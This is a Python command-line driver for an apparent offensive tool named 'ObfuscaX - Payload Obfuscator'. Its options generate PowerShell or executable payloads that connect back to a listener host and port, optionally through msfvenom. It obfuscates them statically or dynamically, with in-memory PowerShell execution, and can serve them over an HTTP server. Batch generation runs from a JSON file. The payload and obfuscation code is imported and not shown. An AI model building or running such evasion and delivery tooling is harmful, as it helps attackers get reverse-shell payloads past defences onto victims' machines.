import argparse
import logging
from msfvenom_integration import generate_payload
from static_obfuscation import static_obfuscate
from dynamic_obfuscation import dynamic_obfuscate
from logger import setup_logger

def main():
    logger = setup_logger()
    parser = argparse.ArgumentParser(description="ObfuscaX - Payload Obfuscator")

    parser.add_argument("--generate", action="store_true", help="Generate payload")
    parser.add_argument("--type", choices=["ps1", "exe"], help="Payload type")
    parser.add_argument("--lhost", type=str, help="Listener IP")
    parser.add_argument("--lport", type=int, help="Listener port")
    parser.add_argument("--obf", choices=["static", "dynamic"], default="static", help="Obfuscation type")
    parser.add_argument("--in-memory", action="store_true", help="Enable in-memory execution (PowerShell only)")
    parser.add_argument("--msfvenom", action="store_true", help="Use msfvenom to generate payload")
    parser.add_argument("--output", type=str, help="Output file name")
    parser.add_argument("--http-server", action="store_true", help="Start HTTP server")
    parser.add_argument("--http-port", type=int, default=8080, help="HTTP server port")
    parser.add_argument("--batch", type=str, help="Batch JSON file for multiple payloads")

    args = parser.parse_args()

    if args.http_server:
        from http.server import HTTPServer, SimpleHTTPRequestHandler
        server_address = ('', args.http_port)
        httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
        logger.info(f"Starting HTTP server on port {args.http_port}")
        httpd.serve_forever()

    elif args.batch:
        import json
        with open(args.batch, 'r') as f:
            batch_jobs = json.load(f)["jobs"]
        for job in batch_jobs:
            logger.info(f"Generating batch payload: {job['output']}")
            payload = generate_payload(job["type"], job.get("lhost"), job.get("lport"), use_msf=job.get("msfvenom", False))
            if job.get("obf", "static") == "static":
                payload = static_obfuscate(payload)
            else:
                payload = dynamic_obfuscate(payload, in_memory=job.get("in_memory", False))
            with open(job["output"], "wb") as file:
                file.write(payload)
            logger.info(f"Saved {job['output']}")

    elif args.generate:
        logger.info(f"Generating payload type {args.type}")
        payload = generate_payload(args.type, args.lhost, args.lport, use_msf=args.msfvenom)
        
        if args.obf == "static":
            payload = static_obfuscate(payload)
        else:
            payload = dynamic_obfuscate(payload, in_memory=args.in_memory)

        with open(args.output, "wb") as f:
            f.write(payload)
        logger.info(f"Payload saved to {args.output}")

    else:
        parser.print_help()

if __name__ == "__main__":
    main()
